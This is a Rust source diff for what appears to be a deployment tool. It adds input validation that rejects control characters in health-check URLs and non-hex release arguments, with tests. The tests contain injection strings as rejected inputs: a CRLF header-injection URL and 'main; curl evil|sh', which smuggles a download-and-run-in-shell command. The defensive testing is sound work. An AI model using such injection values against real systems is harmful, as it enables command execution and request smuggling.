@@ -497,6 +497,15 @@ impl App {
                         Some(name),
                         "a container app needs health_url: it is the gate a swapdock waits on",
                     )),
+                    Some(u) if u.chars().any(|c| c == '\r' || c == '\n' || c.is_control()) => {
+                        out.push(Problem::error(
+                            "health-url-invalid",
+                            Some(name),
+                            format!(
+                                "health_url {u:?} must not contain CR, LF or control characters"
+                            ),
+                        ));
+                    }
                     Some(u) if !(u.starts_with("http://") || u.starts_with("https://")) => {
                         out.push(Problem::error(
                             "health-url-invalid",
@@ -815,6 +824,15 @@ pub fn is_valid_env_name(name: &str) -> bool {
 /// True for a hex commit name of 7 to 40 characters.
 pub fn is_valid_release(release: &str) -> bool {
     (7..=40).contains(&release.len()) && release.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// True for a release supplied on the command line or in an API body.
+///
+/// The accepted range covers an abbreviated and a full commit name (SHA-1 and
+/// SHA-256). Anything else — a branch, a tag, a shell fragment — is refused
+/// before it can reach a build script or an image tag.
+pub fn is_valid_release_arg(release: &str) -> bool {
+    (4..=64).contains(&release.len()) && release.chars().all(|c| c.is_ascii_hexdigit())
 }
 
 #[cfg(test)]
@@ -1136,6 +1154,10 @@ pub(crate) mod tests {
 
         app.health_url = Some("127.0.0.1/".into());
         assert!(codes(&app).contains(&"health-url-invalid"));
+
+        // CR/LF would inject into the raw probe request.
+        app.health_url = Some("http://127.0.0.1/\r\nX-Evil: 1".into());
+        assert!(codes(&app).contains(&"health-url-invalid"));
     }
 
     #[test]
@@ -1184,6 +1206,33 @@ pub(crate) mod tests {
                 !codes(&app).contains(&"release-not-a-commit-name"),
                 "{good:?} must be accepted"
             );
+        }
+    }
+
+    #[test]
+    fn release_args_are_hex_of_a_sane_length() {
+        let long_40 = "a".repeat(40);
+        let long_64 = "f".repeat(64);
+        for good in [
+            "abcd",
+            "9c1f2ab",
+            "9C1F2AB",
+            long_40.as_str(),
+            long_64.as_str(),
+        ] {
+            assert!(is_valid_release_arg(good), "{good:?} must be accepted");
+        }
+        let long_65 = "a".repeat(65);
+        for bad in [
+            "",
+            "abc",
+            "main",
+            "main; curl evil|sh",
+            "9c1f2ab ",
+            "9c1f2abZZZ",
+            long_65.as_str(),
+        ] {
+            assert!(!is_valid_release_arg(bad), "{bad:?} must be refused");
         }
     }
 
